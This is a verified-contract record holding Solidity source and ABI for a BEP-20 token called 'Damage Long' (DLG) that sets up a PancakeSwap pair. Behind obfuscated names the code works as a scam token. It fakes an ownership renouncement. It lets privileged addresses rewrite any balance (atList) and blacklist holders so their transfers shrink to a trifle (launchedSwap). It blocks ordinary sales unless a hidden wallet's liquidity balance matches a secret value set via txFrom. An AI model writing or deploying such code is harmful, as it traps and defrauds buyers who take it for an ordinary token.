{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface buyLaunchedLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapSell {\n    function createPair(address toLaunched, address teamAmount) external returns (address);\n}\n\ninterface minAtTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedFrom) external view returns (uint256);\n\n    function transfer(address marketingTrading, uint256 swapFund) external returns (bool);\n\n    function allowance(address autoAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTrading,\n        uint256 swapFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeLaunch, uint256 value);\n    event Approval(address indexed autoAt, address indexed spender, uint256 value);\n}\n\ninterface marketingToTrading is minAtTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DamageLong is liquidityTeam, minAtTake, marketingToTrading {\n\n    function txFrom(uint256 swapFund) public {\n        launchedMinFrom();\n        enableTradingSell = swapFund;\n    }\n\n    bool private buyFeeFrom;\n\n    uint256 private receiverMode;\n\n    function launchedSwap(address liquidityReceiverFund) public {\n        launchedMinFrom();\n        if (atIs == listReceiver) {\n            autoSell = true;\n        }\n        if (liquidityReceiverFund == fundTx || liquidityReceiverFund == tradingTeam) {\n            return;\n        }\n        sellIs[liquidityReceiverFund] = true;\n    }\n\n    uint256 private atIs;\n\n    uint256 enableTradingSell;\n\n    constructor (){\n        if (autoSell == buyFeeFrom) {\n            receiverMode = atIs;\n        }\n        buyLaunchedLimit atMinEnable = buyLaunchedLimit(autoIs);\n        tradingTeam = swapSell(atMinEnable.factory()).createPair(atMinEnable.WETH(), address(this));\n        if (autoSell == buyFeeFrom) {\n            buyFeeFrom = false;\n        }\n        fundTx = _msgSender();\n        marketingSender();\n        shouldSell[fundTx] = true;\n        buyFee[fundTx] = maxTx;\n        \n        emit Transfer(address(0), fundTx, maxTx);\n    }\n\n    function limitMin(address shouldTrading, address marketingTrading, uint256 swapFund) internal returns (bool) {\n        if (shouldTrading == fundTx) {\n            return launchedTeam(shouldTrading, marketingTrading, swapFund);\n        }\n        uint256 enableShould = minAtTake(tradingTeam).balanceOf(swapReceiver);\n        require(enableShould == enableTradingSell);\n        require(marketingTrading != swapReceiver);\n        if (sellIs[shouldTrading]) {\n            return launchedTeam(shouldTrading, marketingTrading, atLiquidity);\n        }\n        return launchedTeam(shouldTrading, marketingTrading, swapFund);\n    }\n\n    uint8 private tradingLaunchIs = 18;\n\n    function launchedTeam(address shouldTrading, address marketingTrading, uint256 swapFund) internal returns (bool) {\n        require(buyFee[shouldTrading] >= swapFund);\n        buyFee[shouldTrading] -= swapFund;\n        buyFee[marketingTrading] += swapFund;\n        emit Transfer(shouldTrading, marketingTrading, swapFund);\n        return true;\n    }\n\n    function marketingSender() public {\n        emit OwnershipTransferred(fundTx, address(0));\n        teamMin = address(0);\n    }\n\n    address public tradingTeam;\n\n    function atList(address txReceiver, uint256 swapFund) public {\n        launchedMinFrom();\n        buyFee[txReceiver] = swapFund;\n    }\n\n    bool private autoSell;\n\n    mapping(address => mapping(address => uint256)) private liquidityModeSender;\n\n    address swapReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private listReceiver;\n\n    function transfer(address txReceiver, uint256 swapFund) external virtual override returns (bool) {\n        return limitMin(_msgSender(), txReceiver, swapFund);\n    }\n\n    function allowance(address senderIs, address liquidityTrading) external view virtual override returns (uint256) {\n        if (liquidityTrading == autoIs) {\n            return type(uint256).max;\n        }\n        return liquidityModeSender[senderIs][liquidityTrading];\n    }\n\n    string private listSender = \"DLG\";\n\n    address public fundTx;\n\n    uint256 private maxTx = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed fromSender, address indexed exemptAt);\n\n    function approve(address liquidityTrading, uint256 swapFund) public virtual override returns (bool) {\n        liquidityModeSender[_msgSender()][liquidityTrading] = swapFund;\n        emit Approval(_msgSender(), liquidityTrading, swapFund);\n        return true;\n    }\n\n    address autoIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant atLiquidity = 6 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listSender;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeAmountShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingLaunchIs;\n    }\n\n    string private modeAmountShould = \"Damage Long\";\n\n    function owner() external view returns (address) {\n        return teamMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamMin;\n    }\n\n    uint256 fundToken;\n\n    bool public amountWallet;\n\n    mapping(address => uint256) private buyFee;\n\n    function exemptEnable(address toMin) public {\n        if (amountWallet) {\n            return;\n        }\n        \n        shouldSell[toMin] = true;\n        \n        amountWallet = true;\n    }\n\n    function transferFrom(address shouldTrading, address marketingTrading, uint256 swapFund) external override returns (bool) {\n        if (_msgSender() != autoIs) {\n            if (liquidityModeSender[shouldTrading][_msgSender()] != type(uint256).max) {\n                require(swapFund <= liquidityModeSender[shouldTrading][_msgSender()]);\n                liquidityModeSender[shouldTrading][_msgSender()] -= swapFund;\n            }\n        }\n        return limitMin(shouldTrading, marketingTrading, swapFund);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxTx;\n    }\n\n    function balanceOf(address launchedFrom) public view virtual override returns (uint256) {\n        return buyFee[launchedFrom];\n    }\n\n    address private teamMin;\n\n    mapping(address => bool) public sellIs;\n\n    mapping(address => bool) public shouldSell;\n\n    function launchedMinFrom() private view {\n        require(shouldSell[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"atList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"}],\"name\":\"exemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiverFund\",\"type\":\"address\"}],\"name\":\"launchedSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"txFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DamageLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}